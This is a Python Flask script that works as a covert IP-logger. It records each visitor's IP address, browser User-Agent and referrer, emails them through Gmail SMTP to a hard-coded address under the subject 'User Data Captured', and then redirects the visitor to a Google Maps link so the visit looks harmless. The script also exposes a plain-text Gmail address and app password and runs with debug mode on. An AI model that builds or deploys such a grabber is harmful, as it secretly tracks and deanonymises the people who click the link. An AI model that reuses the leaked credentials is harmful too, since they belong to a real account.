from flask import Flask, request, redirect
import smtplib
from email.mime.text import MIMEText

app = Flask(__name__)


SMTP_SERVER = "smtp.gmail.com"  
SMTP_PORT = 587  
SMTP_USERNAME = "alotibyabdallh@gmail.com"  
SMTP_PASSWORD = "jiry jnrr cipm edap"  
TO_EMAIL = "alotibyabdallh@gmail.com"  


REDIRECT_URL = "https://maps.app.goo.gl/1KbWr3dmfjY7SsQB8?g_st=com.google.maps.preview.copy"  

def send_email(user_data):
    try:
        
        msg = MIMEText(user_data)
        msg["Subject"] = "User Data Captured"
        msg["From"] = SMTP_USERNAME
        msg["To"] = TO_EMAIL

        
        with smtplib.SMTP(SMTP_SERVER, SMTP_PORT) as server:
            server.starttls()  
            server.login(SMTP_USERNAME, SMTP_PASSWORD)
            server.send_message(msg)
            print("Email sent successfully!")
    except Exception as e:
        print(f"Failed to send email: {e}")

@app.route("/")
def capture_and_redirect():
    
    ip_address = request.remote_addr
    user_agent = request.headers.get("User-Agent")
    referrer = request.referrer

    
    user_data = f"IP Address: {ip_address}\nUser-Agent: {user_agent}\nReferrer: {referrer}"

    
    send_email(user_data)

    
    return redirect(REDIRECT_URL)

if __name__ == "__main__":
    app.run(debug=True,host='0.0.0.0')